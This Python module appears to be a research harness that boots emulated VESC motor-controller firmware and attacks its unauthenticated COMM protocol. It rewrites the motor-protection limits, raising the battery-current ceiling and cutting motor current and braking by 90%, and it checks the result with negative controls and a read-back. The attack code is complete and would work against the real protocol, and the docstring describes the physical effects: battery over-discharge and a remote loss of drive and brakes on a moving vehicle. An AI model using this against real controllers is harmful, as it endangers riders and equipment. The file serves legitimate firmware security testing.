# Copyright 2026 Christopher Wright
# SPDX-License-Identifier: AGPL-3.0-or-later
"""The vesc-bldc-f405 attack, driven against the firmware's OWN COMM engine.

**The vulnerability.** VESC's binary COMM protocol has no authentication, no
session and no sequence number. Every command is accepted from anyone who can
put bytes on the controller's UART header (or its CAN bus, or its USB port).
``COMM_SET_MCCONF`` is one of those commands, and it rewrites the *motor
configuration* -- including ``l_current_max``, the motor-current limit that is
the ESC's and the motor's primary protection against overcurrent. The firmware's
only check is a four-byte ``MCCONF_SIGNATURE`` constant compiled into the image
(``confgenerator.h:11``), which is a **version tag, not a credential**: it is the
same for every VESC of that firmware version, and the device hands it out itself
in every ``COMM_GET_MCCONF`` reply.

**The attack.** Read the live configuration with ``COMM_GET_MCCONF``, change two
of the motor's protection limits in the firmware's own values, write them back
with ``COMM_SET_MCCONF_TEMP``, and read them out again:

* ``l_in_current_max`` 250.0 A -> **300.0 A** -- the battery-current ceiling, i.e.
  how hard the controller is allowed to pull on the pack. Raising it is how you
  push a battery past its safe discharge rate.
* ``l_current_max_scale`` 1.00 -> **0.10** -- the motor-current scaling, i.e. a
  90 % cut in available torque and regenerative braking. On a moving vehicle
  that is a sudden, remote loss of drive and brake.

``COMM_SET_MCCONF_TEMP`` writes straight into
``mc_interface_get_configuration()``; with its ``store`` flag clear it does not
touch the emulated EEPROM, so the change is live immediately (see
``STATUS.md`` for why the EEPROM-writing ``COMM_SET_MCCONF`` is impractically
slow under emulation). Every field the attacker does not intend to change is
copied out of the device's own reply, so the packet is a real read-modify-write.

**The oracle is the firmware's own reply.** ``landed`` is set only when a
*second, independent* ``COMM_GET_MCCONF`` -- a fresh request, answered by
``commands_send_mcconf()`` out of ``mc_interface_get_configuration()``, framed
and CRC'd by the firmware's own ``packet.c`` -- reports the attacker's value.
Nothing on this side is consulted.

**Negative controls run in the same harness, on the same connection** (playbook
§2.22 -- an attack that only shows "the write worked" proves very little):

  1. *Bad CRC.* **The attack frame itself**, byte for byte, with one byte of the
     CRC flipped. ``try_decode_packet()`` must drop it: no reply, and the
     configuration must be untouched. Same harness, same payload, same code path
     on this side -- the only difference is the checksum, so if this "worked" the
     oracle would be measuring the harness rather than the firmware.
  2. *Values the firmware must refuse.* The same command asking for
     ``l_in_current_max = 5000 A`` and ``l_current_max_scale = 9.0``. The handler
     runs ``utils_truncate_number()`` against this board's own
     ``HW_LIM_CURRENT_IN`` (-300, 300) and against the fixed 0.0-1.0 scale range,
     so the firmware must clamp them to 300.0 and 1.0. A device that merely
     stored what it was handed would report 5000 and 9.0 back.

If either control "succeeds", the oracle is measuring this harness rather than
the firmware, and ``landed`` is forced false with the reason recorded.
"""
from __future__ import annotations

import json
import os
import socket
import subprocess
import sys
import time
from typing import Callable, Dict, List, Optional

from . import paths, spawn
from . import vesc_comm as vc

# What the attacker installs. Both are chosen so the read-back tests the WRITE
# and not a clamp: hw_100_250.h:256 declares HW_LIM_CURRENT_IN -300.0, 300.0, so
# 300.0 A is the top of this hardware's own range and passes
# `utils_truncate_number()` unchanged; and the handler truncates the current
# scales to 0.0-1.0, so 0.10 passes too. Both are exactly representable in the
# encodings VESC uses (binary32, and int16/10000).
ATTACK_IN_CURRENT_MAX = 300.0
ATTACK_CURRENT_MAX_SCALE = 0.10

# A terminal command the firmware answers with a string only IT can produce.
# Sending one is also load-bearing, not decoration: `commands_printf()` writes
# through `send_func_blocking`, and NOTHING sets that except the blocking
# command group -- of which COMM_TERMINAL_CMD is a member (commands.c:1687-1715).
# Until a terminal command has been sent, every warning the firmware prints,
# including the one the negative control is looking for, is composed and then
# dropped on the floor with no error. That is a property of the firmware, not of
# this rehost.
TERMINAL_PROBE = b"fault"

BOOT_MARKER = "USART3: enabled by the firmware"
BOOT_TIMEOUT = float(os.environ.get("VESC_BOOT_TIMEOUT", "900"))
REPLY_TIMEOUT = float(os.environ.get("VESC_REPLY_TIMEOUT", "180"))
# How long to wait when the firmware's source says NOTHING should come back.
SILENCE_TIMEOUT = float(os.environ.get("VESC_SILENCE_TIMEOUT", "25"))


class VescScenario:
    """Boots the rehosted VESC and speaks its COMM protocol over the USART3
    bridge. The firmware is the real rehost; nothing here is simulated."""

    def __init__(self, bridge_port: int = spawn.BRIDGE_PORT,
                 python: Optional[str] = None,
                 log_dir: Optional[str] = None) -> None:
        self.bridge_port = bridge_port
        self.python = python or sys.executable
        self.log_dir = log_dir or "/tmp"
        self.host = "127.0.0.1"
        self._procs: List[subprocess.Popen] = []
        self._sock: Optional[socket.socket] = None
        self._rx = bytearray()
        self.log = os.path.join(self.log_dir, "vesc_bldc_f405_attack.log")

    # ---- process management ------------------------------------------------
    def _spawn(self, argv, cwd, env, logpath) -> subprocess.Popen:
        p = subprocess.Popen(argv, cwd=cwd, env=env, stdout=open(logpath, "w"),
                             stderr=subprocess.STDOUT, preexec_fn=os.setsid)
        self._procs.append(p)
        return p

    def _log_has(self, needle: str) -> bool:
        try:
            return needle in open(self.log, errors="replace").read()
        except OSError:
            return False

    def shutdown(self) -> None:
        # Kill ONLY the PIDs we started. Never a global pattern kill: several
        # emulators run on this machine at once (playbook §2.10).
        if self._sock is not None:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None
        for p in self._procs:
            try:
                os.killpg(os.getpgid(p.pid), 15)
            except Exception:  # noqa: BLE001
                pass
            try:
                p.wait(10)
            except Exception:  # noqa: BLE001
                try:
                    p.kill()
                except Exception:  # noqa: BLE001
                    pass
        self._procs = []

    def boot(self, on_stage: Callable) -> bool:
        if not paths.firmware_present():
            on_stage("error", note="firmware not found at %s -- build it "
                                   "(FIRMWARE.md) and run "
                                   "tools/extract_firmware.py"
                     % paths.firmware_bin())
            return False
        argv = spawn.spawn_argv(python=self.python, emulator="unicorn")
        env = spawn.spawn_env(uart_port=self.bridge_port)
        on_stage("boot", note="booting the VESC firmware under HALucinator "
                              "(ChibiOS on an STM32F405; reaching the COMM "
                              "stack takes a couple of minutes of wall clock)")
        p = self._spawn(argv, spawn.spawn_cwd(), env, self.log)

        # Readiness is the FIRMWARE's own driver reaching the port: the USART3
        # model logs the moment app_uartcomm_start() writes CR1.UE. Poll the log
        # rather than sleeping (macOS has no timeout(1); playbook §1).
        deadline = time.time() + BOOT_TIMEOUT
        while time.time() < deadline:
            if p.poll() is not None:
                on_stage("error", note="HALucinator exited during boot (rc=%s, "
                                       "see %s)" % (p.poll(), self.log))
                return False
            if self._log_has(BOOT_MARKER):
                break
            time.sleep(2)
        else:
            on_stage("error", note="the firmware never enabled USART3 (see %s)"
                     % self.log)
            return False

        try:
            self._sock = socket.create_connection(
                (self.host, self.bridge_port), timeout=10)
            self._sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except OSError as exc:
            on_stage("error", note="could not connect to the USART3 bridge on "
                                   "tcp/%d: %s" % (self.bridge_port, exc))
            return False
        on_stage("ready", note="USART3 is up; connected to the COMM seam on "
                               "tcp/%d" % self.bridge_port)
        return True

    # ---- protocol ----------------------------------------------------------
    def _send(self, raw: bytes) -> None:
        assert self._sock is not None
        self._sock.sendall(raw)

    def _read_frame(self, timeout: float = REPLY_TIMEOUT,
                    want: Optional[int] = None) -> Optional[bytes]:
        """Read until a complete, CRC-valid frame arrives (optionally with a
        given packet id). Returns the payload, or None on timeout.

        Frames are consumed from a persistent buffer, so an unsolicited
        ``COMM_PRINT`` cannot desynchronise the next read.
        """
        assert self._sock is not None
        deadline = time.time() + timeout
        while True:
            while True:
                payload, used = vc.unframe(bytes(self._rx))
                if payload is None:
                    break
                del self._rx[:used]
                if want is None or (payload and payload[0] == want):
                    return payload
            remaining = deadline - time.time()
            if remaining <= 0:
                return None
            self._sock.settimeout(min(remaining, 10.0))
            try:
                chunk = self._sock.recv(4096)
            except socket.timeout:
                continue
            except OSError:
                return None
            if not chunk:
                return None
            self._rx += chunk

    def request(self, payload: bytes, want: Optional[int] = None,
                timeout: float = REPLY_TIMEOUT) -> Optional[bytes]:
        self._send(vc.frame(payload))
        return self._read_frame(timeout=timeout, want=want)

    def fw_version(self) -> Optional[bytes]:
        return self.request(bytes([vc.COMM_FW_VERSION]),
                            want=vc.COMM_FW_VERSION)

    def get_mcconf(self) -> Optional[bytes]:
        """The firmware's own serialized mc_configuration (without the id byte)."""
        payload = self.request(bytes([vc.COMM_GET_MCCONF]),
                               want=vc.COMM_GET_MCCONF)
        return None if payload is None else payload[1:]

    # ---- read / attack seams ----------------------------------------------
    def read_state(self) -> Dict[str, object]:
        """The firmware's real state, read through its real protocol engine."""
        state: Dict[str, object] = {}
        fw = self.fw_version()
        if fw is not None:
            state["fw_version_frame"] = vc.frame(fw).hex()
            try:
                state.update(vc.parse_fw_version(fw))
            except ValueError:
                pass
        conf = self.get_mcconf()
        if conf is not None:
            state.update(self._decode(conf))
        return state

    @staticmethod
    def _decode(conf: bytes) -> Dict[str, object]:
        """The limits this attack targets, out of the firmware's own bytes."""
        return {
            "mcconf_len": len(conf),
            "mcconf_signature": "0x%08x" % int.from_bytes(conf[:4], "big"),
            "l_current_max": round(
                vc.parse_float32_auto(conf, vc.MCCONF_OFF_L_CURRENT_MAX), 3),
            "l_in_current_max": round(
                vc.parse_float32_auto(conf, vc.MCCONF_OFF_L_IN_CURRENT_MAX), 3),
            "l_current_max_scale": round(
                vc.parse_float16(conf, vc.MCCONF_OFF_L_CURRENT_MAX_SCALE), 4),
        }

    def terminal(self, cmd: bytes,
                 timeout: float = REPLY_TIMEOUT) -> Optional[str]:
        """Run a command on the firmware's own debug terminal, unauthenticated.

        Also registers this connection as ``send_func_blocking``, which is what
        makes ``commands_printf()`` reach the wire at all.
        """
        payload = self.request(bytes([vc.COMM_TERMINAL_CMD]) + cmd,
                               want=vc.COMM_PRINT, timeout=timeout)
        if payload is None:
            return None
        return bytes(payload[1:]).split(b"\x00")[0].decode("latin-1", "replace")

    def attack(self) -> dict:
        """Unauthenticated COMM_SET_MCCONF_TEMP: move the motor's safety limits.

        Runs the negative controls in the SAME harness on the SAME connection,
        then the attack, then a fresh independent read-back. ``landed`` requires
        all of it.
        """
        res: dict = {"landed": False}

        # A terminal session: unauthenticated in its own right, and the reply is
        # a string only the firmware can produce.
        res["terminal_cmd"] = TERMINAL_PROBE.decode()
        res["terminal_reply"] = self.terminal(TERMINAL_PROBE)

        base = self.get_mcconf()
        if base is None:
            res["error"] = "the firmware did not answer COMM_GET_MCCONF"
            return res
        res["before"] = self._decode(base)
        res["requested"] = {"l_in_current_max": ATTACK_IN_CURRENT_MAX,
                            "l_current_max_scale": ATTACK_CURRENT_MAX_SCALE}

        payload = vc.set_mcconf_temp_payload(
            base, store=False, ack=True,
            l_in_current_max=ATTACK_IN_CURRENT_MAX,
            l_current_max_scale=ATTACK_CURRENT_MAX_SCALE)
        good = vc.frame(payload)
        res["attack_frame"] = good.hex()

        # ---- negative control 1: THE SAME FRAME with a corrupted CRC --------
        # Byte for byte the attack, one byte different, and that byte is only
        # the checksum. try_decode_packet() must drop it: no reply, and no
        # change. If this "worked", the oracle would be measuring this harness
        # rather than the firmware (playbook §2.22).
        bad_crc = bytearray(good)
        bad_crc[-3] ^= 0xFF
        self._send(bytes(bad_crc))
        res["neg_bad_crc_reply"] = self._read_frame(
            timeout=SILENCE_TIMEOUT) is not None
        after_crc = self.get_mcconf()
        res["neg_bad_crc_state"] = None if after_crc is None \
            else self._decode(after_crc)
        res["neg_bad_crc_rejected"] = bool(
            not res["neg_bad_crc_reply"]
            and after_crc is not None
            and self._decode(after_crc) == res["before"])

        # ---- negative control 2: values the firmware MUST refuse ----------
        # The same command, the same code path, but asking for
        # l_in_current_max = 5000 A and l_current_max_scale = 9.0. The handler
        # runs `utils_truncate_number()` against this hardware's own
        # HW_LIM_CURRENT_IN (-300, 300) and against the fixed 0.0-1.0 range for
        # the scales, so a device that DISCRIMINATES clamps them to 300.0 and
        # 1.0; a device (or a harness) that merely stores what it is handed
        # would report 5000 and 9.0 back. This is the control that proves the
        # positive result is the firmware accepting a value rather than an echo
        # (playbook §2.22).
        absurd = vc.set_mcconf_temp_payload(
            base, store=False, ack=True,
            l_in_current_max=5000.0, l_current_max_scale=9.0)
        self._send(vc.frame(absurd))
        clamp_ack = self._read_frame(timeout=REPLY_TIMEOUT)
        res["neg_clamp_ack_id"] = None if clamp_ack is None else clamp_ack[0]
        after_clamp = self.get_mcconf()
        res["neg_clamp_state"] = None if after_clamp is None \
            else self._decode(after_clamp)
        res["neg_clamp_enforced"] = bool(
            after_clamp is not None
            and abs(self._decode(after_clamp)["l_in_current_max"] - 300.0) < 1e-3
            and abs(self._decode(after_clamp)["l_current_max_scale"] - 1.0) < 1e-4)

        # Put the limits back where the device had them, so the attack below
        # starts from the device's own configuration and its effect is
        # unambiguous.
        self._send(vc.frame(vc.set_mcconf_temp_payload(
            base, store=False, ack=True,
            l_in_current_max=res["before"]["l_in_current_max"],
            l_current_max_scale=res["before"]["l_current_max_scale"])))
        self._read_frame(timeout=REPLY_TIMEOUT)
        restored = self.get_mcconf()
        res["restored_state"] = None if restored is None \
            else self._decode(restored)

        # ---- the attack ------------------------------------------------------
        self._send(good)
        ack = self._read_frame(timeout=REPLY_TIMEOUT)
        res["set_ack_id"] = None if ack is None else ack[0]
        res["set_ack_frame"] = "" if ack is None else vc.frame(ack).hex()

        # ---- an INDEPENDENT read-back: the oracle ---------------------------
        after = self.get_mcconf()
        if after is None:
            res["error"] = "no COMM_GET_MCCONF reply after the write"
            return res
        res["after"] = self._decode(after)
        res["readback_in_current_max_bytes"] = after[
            vc.MCCONF_OFF_L_IN_CURRENT_MAX:
            vc.MCCONF_OFF_L_IN_CURRENT_MAX + 4].hex()
        res["readback_current_max_scale_bytes"] = after[
            vc.MCCONF_OFF_L_CURRENT_MAX_SCALE:
            vc.MCCONF_OFF_L_CURRENT_MAX_SCALE + 2].hex()

        changed = (
            abs(res["after"]["l_in_current_max"] - ATTACK_IN_CURRENT_MAX) < 1e-3
            and abs(res["after"]["l_current_max_scale"]
                    - ATTACK_CURRENT_MAX_SCALE) < 1e-4
            and res["after"] != res["before"])
        res["changed"] = changed

        res["landed"] = bool(changed
                             and res["neg_bad_crc_rejected"]
                             and res["neg_clamp_enforced"])
        if changed and not res["landed"]:
            res["error"] = ("the write landed but a negative control did NOT "
                            "behave as the firmware's source says it must, so "
                            "the oracle is not trustworthy on this run")
        return res


def run_attack(on_stage: Optional[Callable] = None,
               log_dir: Optional[str] = None) -> dict:
    """Fleet-standard entry point (playbook §2a). Self-booting.

    Returns at least ``booted`` and ``landed``. ``landed`` comes from the
    firmware's OWN COMM replies, never from host bookkeeping.
    """
    def stage(name, **d):
        if on_stage:
            on_stage(name, **d)

    sc = VescScenario(python=sys.executable, log_dir=log_dir or "/tmp")
    result: dict = {"booted": False, "landed": False}
    try:
        if not sc.boot(stage):
            return result
        result["booted"] = True
        state = sc.read_state()
        stage("read", state=state)
        atk = sc.attack()
        stage("attack", result=atk)
        result["state"] = state
        result["attack"] = atk
        result["landed"] = bool(atk.get("landed"))
    finally:
        sc.shutdown()
    return result


def main() -> int:
    def show(name, **data):
        note = data.get("note", "")
        if note:
            print(f"[stage] {name}: {note}", flush=True)
        elif "state" in data:
            print(f"[stage] {name}: {json.dumps(data['state'])}", flush=True)
        elif "result" in data:
            print(f"[stage] {name}: {json.dumps(data['result'])}", flush=True)
        else:
            print(f"[stage] {name}", flush=True)

    res = run_attack(on_stage=show)
    print("RESULT:", json.dumps({k: v for k, v in res.items()
                                 if k in ("booted", "landed")}))
    return 0 if res.get("landed") else 1


if __name__ == "__main__":
    raise SystemExit(main())
